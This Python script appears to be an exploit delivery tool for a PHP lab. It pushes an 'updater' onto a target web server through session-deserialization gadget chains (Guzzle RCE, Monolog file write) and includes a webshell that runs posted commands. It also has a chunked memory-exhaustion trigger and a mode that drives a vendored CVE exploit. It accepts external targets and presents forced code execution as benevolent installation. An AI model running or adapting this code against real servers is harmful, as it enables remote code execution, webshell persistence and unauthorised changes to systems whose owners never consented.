#!/usr/bin/env python3
"""
PHP2Shell delivery vehicle for the benevolent-php lab.

Delivers php2shell_updater.php to the lab target (http://0.0.0.0:8080/ by
default, PHP 8.1.34 php -S, CVE-2026-109618 / CVE-2026-109619) and returns
the installation result.

Claims, precisely: the POST exercises the real CVE trigger path (pre-RINIT
session.upload_progress handler, min_freq re-init, and --mode trigger-only's
chunked OOM-bailout seed), but that path executes NOTHING. The working code
execution (rungs 1-2) comes from a separate, app-specific unsafe
session_decode() sink plus real-package deserialization gadgets
(phpggc Guzzle/RCE/1, Monolog/FW/1) — an object-injection chain that does not
depend on the CVEs and works the same on patched PHP. No ASLR bypass, no
heap grooming. See README "How it works".

Execution ladder (all gadgets are REAL packages installed via Composer —
Guzzle 6.3.2 / psr7 1.4.2 / Monolog 3.x — using phpggc's documented chains):

  rung 1 "guzzle-rce"  (default): ONE POST. The multipart request carries the
      complete updater source (attachment) and a poisoned session payload
      ("cart_state"): a GuzzleHttp\\Psr7\\FnStream whose close handler is a
      GuzzleHttp\\HandlerStack resolving to system("<command>"). The lab app
      session_decodes it; __destruct() at request shutdown runs the command
      (php /tmp/php2shell_updater.php --apply), and the response body carries
      the full installation output. (phpggc Guzzle/RCE/1)

  rung 2 "monolog-fw" (--mode write-invoke): TWO POSTs. The first drops a
      webshell into the docroot — a Monolog GroupHandler->DeduplicationHandler
      whose destructor flushes the stored message to the target path
      (/app/shell_<rand>.php, clean bytes: "<ts>:Debug:<?php ...?>"). The
      second POSTs the command to that webshell and returns its output.
      (phpggc Monolog/FW/1)

  rung 3 "trigger-only" (--mode trigger-only): no gadget at all. A chunked
      (no Content-Length) multipart seed whose huge upload-progress marker
      drives the rfc1867/session path into the memory_limit bailout — the
      CVE-2026-109618 OOM-abort trigger documented by the public b63 driver.
      This exercises the vulnerable runtime; it does not execute code.

Options:
  --command CMD        override the gadget command (chain validation, e.g. 'id')
  --dry-run            run the updater WITHOUT --apply (prints its plan only)
  --mode MODE          guzzle-rce (default) | write-invoke | trigger-only
  --no-stall           skip the >1s mid-upload stall (min_freq re-entry)
  --sid SID            fixed PHPSESSID instead of a random one
  --url URL            target (default http://0.0.0.0:8080/test.php)
  --container CID      lab container id (auto-detected from port 8080)
  --dump-request FILE  save the exact raw HTTP request bytes of the first POST
  --timeout SECS       response read timeout (default 1500)

Validation examples:
  python3 deliver_update.py --command 'id; echo PWNED-OK > /tmp/pwned.txt'
  python3 deliver_update.py --mode write-invoke --command id
  python3 deliver_update.py --dry-run
"""

import argparse
import base64
import os
import socket
import subprocess
import sys
import time
import uuid
from urllib.parse import urlsplit

HERE = os.path.dirname(os.path.abspath(__file__))
UPDATER_PATH = os.path.join(HERE, "php2shell_updater.php")
GEN_PAYLOAD = "/app/payload/gen_session_payload.php"

SHELL_CODE = '<?php echo shell_exec(file_get_contents("php://input"));?>'

SUCCESS_MARKERS = (b"Updater:", b"SERVER_RESTART_SCHEDULED", b"FILES_VERIFIED",
                   b"DRY_RUN", b"NO_CHANGE", b"PASS", b"ERROR")


def detect_container():
    out = subprocess.run(["docker", "ps", "-q", "--filter", "publish=8080"],
                         capture_output=True, text=True)
    cids = [line for line in out.stdout.splitlines() if line]
    return cids[0] if cids else None


def gen_cart_state(container, args):
    """Run the PHP payload generator in the lab container -> base64 cart_state."""
    cmd = ["docker", "exec", "-w", "/app", container, "php", GEN_PAYLOAD] + args
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if proc.returncode != 0:
        raise SystemExit("payload generator failed: " + proc.stderr.strip())
    return proc.stdout.strip()


def updater_command(updater_source, apply_flags):
    b64 = base64.b64encode(updater_source).decode()
    # The lab server's parent is `bash -c '... & wait'`: the updater's internal
    # restart helper kills the php -S process, bash's wait returns, and the
    # container exits. For containers the updater's own contract is
    # --external-restart + SERVER_RESTART_REQUIRED, with the restart performed
    # from outside (docker restart) after the response is received. Bare-metal
    # targets pass --apply only (the updater restarts apt/brew services itself).
    return ('php -r \'file_put_contents("/tmp/php2shell_updater.php", '
            f'base64_decode("{b64}"));\' && php /tmp/php2shell_updater.php {apply_flags}').strip()


def build_multipart(sid, marker, cart_state, attachment_name, attachment_data):
    boundary = "----bnd" + uuid.uuid4().hex[:16]
    b = boundary.encode()
    out = bytearray()
    out += b"--" + b + b"\r\n"
    out += b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n"
    out += b"--" + b + b"\r\n"
    out += (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            b'\r\n\r\n' + marker.encode() + b"\r\n")
    out += b"--" + b + b"\r\n"
    out += (b'Content-Disposition: form-data; name="cart_state"\r\n\r\n'
            + cart_state.encode() + b"\r\n")
    out += b"--" + b + b"\r\n"
    out += (b'Content-Disposition: form-data; name="attachment"; filename="'
            + attachment_name.encode() + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n'
            + attachment_data + b"\r\n")
    out += b"--" + b + b"--\r\n"
    return boundary, bytes(out)


def post(url, boundary, body, stall_at, stall_seconds, timeout):
    u = urlsplit(url)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    path = (u.path or "/") + ("?" + u.query if u.query else "")
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=30)
    s.settimeout(timeout)
    s.sendall(head)
    s.sendall(body[:stall_at])
    if stall_seconds > 0:
        print(f"[*] {stall_seconds}s stall mid-upload "
              f"(session.upload_progress.min_freq re-entry)", file=sys.stderr)
        time.sleep(stall_seconds)
    s.sendall(body[stall_at:])
    print(f"[*] request sent ({len(head) + len(body)} bytes); "
          f"waiting for the response...", file=sys.stderr)
    chunks = []
    idle = 0
    while True:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            idle += timeout
            print(f"[*] still waiting ({idle}s idle, "
                  f"{sum(map(len, chunks))} bytes so far)...", file=sys.stderr)
            continue
        if not chunk:
            break
        chunks.append(chunk)
    s.close()
    raw = b"".join(chunks)
    status = raw.split(b"\r\n", 1)[0].decode(errors="replace")
    parts = raw.split(b"\r\n\r\n", 1)
    return status, parts[1] if len(parts) > 1 else b""


def raw_post(url, payload, timeout):
    """Simple POST with an arbitrary body (used for the webshell invoke)."""
    u = urlsplit(url)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    path = (u.path or "/") + ("?" + u.query if u.query else "")
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Connection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=30)
    s.settimeout(timeout)
    s.sendall(head + payload)
    chunks = []
    while True:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            continue
        if not chunk:
            break
        chunks.append(chunk)
    s.close()
    raw = b"".join(chunks)
    status = raw.split(b"\r\n", 1)[0].decode(errors="replace")
    parts = raw.split(b"\r\n\r\n", 1)
    return status, parts[1] if len(parts) > 1 else b""


def trigger_only(url, sid, size_mb, pad_mb):
    """Rung 3: chunked (no Content-Length) OOM seed against the upload-progress
    path. Adapted from the public b63 CVE-2026-109618 driver (agentic exploit
    foundry, basesixtythree/B63-POC-CVE-2026-109618): the chunked body bypasses
    the rfc1867 post_max_size gate, the huge progress marker drives the session
    write, and the huge FILE pad drives parsing into the memory_limit bailout
    before MULTIPART_EVENT_END (so the progress cleanup never runs)."""
    u = urlsplit(url)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    path = (u.path or "/") + ("?" + u.query if u.query else "")
    boundary = "b63-bgctx-2026"
    marker = "A" * (size_mb * 1024 * 1024)
    pad = b"A" * (256 * 1024)
    total_pad = pad_mb * 1024 * 1024
    body_head = (f"--{boundary}\r\n"
                 f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
                 f"--{boundary}\r\n"
                 f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                 f"{marker}\r\n"
                 f"--{boundary}\r\n"
                 f'Content-Disposition: form-data; name="f"; filename="f.txt"\r\n'
                 f"Content-Type: application/octet-stream\r\n\r\n").encode()
    body_tail = (f"\r\n--{boundary}--\r\n").encode()
    s = socket.create_connection((host, port), timeout=30)
    s.settimeout(300)
    # Chunked encoding: no Content-Length -> the rfc1867 post_max_size gate is
    # bypassed and the huge progress marker drives memory toward the limit.
    head = (f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n").encode()
    s.sendall(head)
    print(f"[*] streaming {size_mb} MB marker + {pad_mb} MB file pad "
          f"via chunked encoding...", file=sys.stderr)

    def send_chunk(chunk):
        s.sendall(f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n")

    for chunk in (body_head[:262144], body_head[262144:]):
        send_chunk(chunk)
    sent = 0
    while sent < total_pad:
        chunk = pad[:min(len(pad), total_pad - sent)]
        send_chunk(chunk)
        sent += len(chunk)
        if sent % (16 * 1024 * 1024) < 262144 and sent:
            print(f"[*]   {sent // (1024*1024)} MB pad sent", file=sys.stderr)
    send_chunk(body_tail)
    s.sendall(b"0\r\n\r\n")
    out = b""
    while True:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
    s.close()
    status = out.split(b"\r\n", 1)[0].decode(errors="replace")
    body = out.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in out else out
    return status, body


def run_rung1(args, container, cart_state, command, updater_source):
    """Single POST: guzzle-rce chain. Response carries the installation result."""
    sid = args.sid or "p2s" + uuid.uuid4().hex[:12]
    boundary, body = build_multipart(sid, "php2shell-delivery", cart_state,
                                     "php2shell_updater.php", updater_source)
    stall = 0 if args.no_stall else len(body) // 2
    print(f"[*] rung 1 (guzzle-rce): single POST carrying "
          f"{len(updater_source)} bytes of updater source", file=sys.stderr)
    if args.dump_request:
        u = urlsplit(args.url)
        path = (u.path or "/") + ("?" + u.query if u.query else "")
        head = (f"POST {path} HTTP/1.1\r\nHost: {u.hostname}:{u.port or 80}\r\n"
                f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        with open(args.dump_request, "wb") as fh:
            fh.write(head + body)
        print(f"[*] raw request saved to {args.dump_request}", file=sys.stderr)
    status, response = post(args.url, boundary, body, stall,
                            0 if args.no_stall else 1.2, args.timeout)
    return status, response


def run_rung2(args, container, cart_state, command, updater_source):
    """Two POSTs: monolog-fw write of a webshell, then invoke it."""
    shell_name = args.shell_name or ("shell_" + uuid.uuid4().hex[:8] + ".php")
    shell_path = "/app/" + shell_name
    if cart_state is None:
        if not container:
            raise SystemExit("write-invoke against an external target needs "
                             "--cart-state (monolog-fw payload for the shell "
                             "path) and --shell-name")
        cart_state = gen_cart_state(container, ["--monolog-fw", shell_path, SHELL_CODE])
    sid = args.sid or "p2s" + uuid.uuid4().hex[:12]
    boundary, body = build_multipart(sid, "php2shell-delivery", cart_state,
                                     "php2shell_updater.php", updater_source)
    stall = 0 if args.no_stall else len(body) // 2
    print(f"[*] rung 2 (monolog-fw): writing webshell {shell_name} via "
          f"Guzzle+Monolog session payload", file=sys.stderr)
    status, response = post(args.url, boundary, body, stall,
                            0 if args.no_stall else 1.2, 300)
    if status != "HTTP/1.1 200 OK":
        print(f"[*] write POST failed: {status}", file=sys.stderr)
        return status, response
    shell_url = args.url.rsplit("/", 1)[0] + "/" + shell_name
    print(f"[*] invoking {shell_url} with the installation command", file=sys.stderr)
    return raw_post(shell_url, command.encode(), args.timeout)


def cve_chain_run(args, updater_source):
    """Drive the real CVE chain (vendored public exploit, mod_php prefork)
    with the updater command, and return the exploit's output."""
    chain_dir = os.path.join(HERE, "research", "cve-chain")
    exploit = os.path.join(chain_dir, "php2shell.py")
    if not os.path.isfile(exploit):
        raise SystemExit("cve-chain exploit not found in research/cve-chain/")
    out_dir = os.path.join(chain_dir, "out")
    os.makedirs(out_dir, exist_ok=True)
    compose_file = os.path.join(chain_dir, "docker", "docker-compose.yml")
    print("[*] cve-chain: starting the vulnerable Apache lab...", file=sys.stderr)
    subprocess.run(["docker", "compose", "-f", compose_file, "up", "-d"],
                   capture_output=True, timeout=180)
    cmd = args.cve_command
    if cmd is None:
        # The repo is mounted at /app in the lab, so the updater source is
        # already on the target; the exploit runs it directly.
        apply_flags = "" if args.dry_run else args.apply_flags
        cmd = f"php /app/php2shell_updater.php {apply_flags}".strip()
    print(f"[*] cve-chain: cmd = {cmd!r}", file=sys.stderr)
    run = subprocess.run([sys.executable, exploit, "exploit", "-u", args.cve_url,
                          "-c", cmd], capture_output=True, text=True,
                         timeout=600)
    print(run.stdout)
    if run.stderr.strip():
        print(run.stderr, file=sys.stderr)
    return run.returncode


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default="http://0.0.0.0:8080/test.php")
    ap.add_argument("--command", default=None,
                    help="override the gadget command (default: install + restart)")
    ap.add_argument("--dry-run", action="store_true",
                    help="run the updater without --apply")
    ap.add_argument("--mode", default="guzzle-rce",
                    choices=["guzzle-rce", "write-invoke", "trigger-only",
                             "cve-chain"])
    ap.add_argument("--cve-url", default="http://127.0.0.1:8088/index.php",
                    help="cve-chain: vulnerable mod_php prefork target "
                         "(php:8.4.26-apache lab by default)")
    ap.add_argument("--cve-command", default=None,
                    help="cve-chain: command for the exploit (default: the "
                         "updater invocation)")
    ap.add_argument("--no-stall", action="store_true")
    ap.add_argument("--no-restart", action="store_true",
                    help="do not restart the container after installation")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--container", default=None)
    ap.add_argument("--cart-state", metavar="B64_OR_FILE", default=None,
                    help="use a pre-generated payload (base64 string or file) "
                         "instead of generating one via docker exec — for "
                         "external targets; generate with "
                         "payload/gen_session_payload.php")
    ap.add_argument("--apply-flags", default="--apply --external-restart",
                    help="updater flags appended to the CLI invocation "
                         "(default: --apply --external-restart; use --apply "
                         "for bare-metal targets)")
    ap.add_argument("--shell-name", default=None,
                    help="write-invoke: webshell filename matching the "
                         "pre-generated payload (external targets)")
    ap.add_argument("--print-command", action="store_true",
                    help="print the install command the script would execute "
                         "and exit (feed it to gen_session_payload.php)")
    ap.add_argument("--dump-request", metavar="FILE")
    ap.add_argument("--timeout", type=int, default=1500)
    ap.add_argument("--marker-mb", type=int, default=8,
                    help="trigger-only: upload-progress marker size in MB")
    ap.add_argument("--pad-mb", type=int, default=200,
                    help="trigger-only: file pad size in MB (OOM pressure)")
    args = ap.parse_args()

    container = args.container if args.container is not None else detect_container()
    cart_state = None
    if args.cart_state:
        path = args.cart_state
        cart_state = (open(path).read().strip() if os.path.exists(path)
                      else args.cart_state.strip())
    if not container and cart_state is None:
        raise SystemExit("no container publishing 8080 and no --cart-state; "
                         "external targets need --cart-state (see README)")

    with open(UPDATER_PATH, "rb") as fh:
        updater_source = fh.read()
    if b"<?php" not in updater_source[:128]:
        raise SystemExit("php2shell_updater.php does not look like PHP source")

    if args.print_command:
        apply_flags = "" if args.dry_run else args.apply_flags
        try:
            print(args.command or updater_command(updater_source, apply_flags))
        except BrokenPipeError:
            pass
        return

    if args.mode == "trigger-only":
        status, response = trigger_only(args.url, args.sid or "b63" + "0123456789abcdef" * 8,
                                        args.marker_mb, args.pad_mb)
        print(f"\nHTTP response: {status}")
        print(response.decode(errors="replace")[:2000])
        print("\n(trigger-only: exercises the OOM-bailout path; no code executed)")
        return

    if args.mode == "cve-chain":
        sys.exit(cve_chain_run(args, updater_source))

    apply_flags = "" if args.dry_run else args.apply_flags
    command = args.command or updater_command(updater_source, apply_flags)
    if args.mode == "guzzle-rce" and args.cart_state is None:
        if not container:
            raise SystemExit("guzzle-rce against an external target needs "
                             "--cart-state (see README)")
        cart_state = gen_cart_state(container, ["--guzzle-rce", command])

    if args.mode == "guzzle-rce":
        status, response = run_rung1(args, container, cart_state, command,
                                     updater_source)
        if args.command or any(m in response for m in SUCCESS_MARKERS):
            print(f"\nHTTP response: {status}")
            print("---- installation result ----")
            print(response.decode(errors="replace"))
            print("---- end of result ----")
            external_restart(args, container)
            return
        print(f"[*] rung 1 did not execute (no updater output); "
              f"falling back to rung 2", file=sys.stderr)

    status, response = run_rung2(args, container, cart_state, command,
                                 updater_source)
    print(f"\nHTTP response: {status}")
    print("---- installation result ----")
    print(response.decode(errors="replace"))
    print("---- end of result ----")

    # Lab hygiene: remove dropped webshells after the delivery completes.
    if container:
        subprocess.run(["docker", "exec", container, "sh", "-c",
                        "rm -f /app/shell_*.php"], capture_output=True)
        print("[*] dropped webshells removed", file=sys.stderr)


def external_restart(args, container):
    """docker restart + poll until the server answers again."""
    if args.dry_run or args.no_restart:
        return
    if "--external-restart" not in args.apply_flags:
        # Bare-metal path: the updater restarted the managed services itself.
        return
    if not container:
        print("[*] no container given: restart the target's PHP server/"
              "container manually, then re-run the verifier", file=sys.stderr)
        return
    print(f"[*] docker restart {container} (SERVER_RESTART_REQUIRED) ...",
          file=sys.stderr)
    subprocess.run(["docker", "restart", container], capture_output=True, timeout=60)
    for _ in range(30):
        time.sleep(2)
        proc = subprocess.run(
            ["curl", "-s", "-m", "3", "-o", "/dev/null", "-w", "%{http_code}",
             args.url], capture_output=True, text=True)
        if proc.stdout.strip() == "200":
            print("[*] server is back up", file=sys.stderr)
            return
    print("[!] server did not respond after restart", file=sys.stderr)


if __name__ == "__main__":
    main()
